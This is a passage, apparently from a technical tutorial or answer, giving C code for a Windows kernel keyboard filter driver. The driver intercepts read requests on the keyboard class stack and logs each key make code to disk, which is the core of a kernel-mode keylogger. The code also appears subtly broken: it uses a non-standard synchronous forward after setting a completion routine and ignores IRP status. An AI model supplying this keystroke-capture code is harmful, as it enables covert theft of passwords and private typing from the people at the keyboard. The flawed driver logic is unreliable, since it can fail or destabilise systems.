## Kernel-Mode Approach (Windows Filter Driver)

For kernel-mode interception, you'd typically write a filter driver attached to the keyboard class device stack:

```c
NTSTATUS DispatchRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    // Attach to keyboard class device
    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);

    // Copy IRP for post-processing
    IoCopyCurrentIrpStackLocationToNext(Irp);

    // Register completion routine
    IoSetCompletionRoutine(Irp, ReadCompletion, DeviceObject,
                           TRUE, TRUE, TRUE);

    return ForwardIrpSynchronous(DeviceObject, Irp);
}

NTSTATUS ReadCompletion(PDEVICE_OBJECT DeviceObject, PIRP Irp,
                        PVOID Context) {
    // Extract key data from IRP buffer
    PKEYBOARD_INPUT_DATA keyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;

    if (keyData && keyData->MakeCode) {
        // Log make code to disk
        WriteToLog(keyData->MakeCode, keyData->Flags);
    }

    return STATUS_SUCCESS;
}
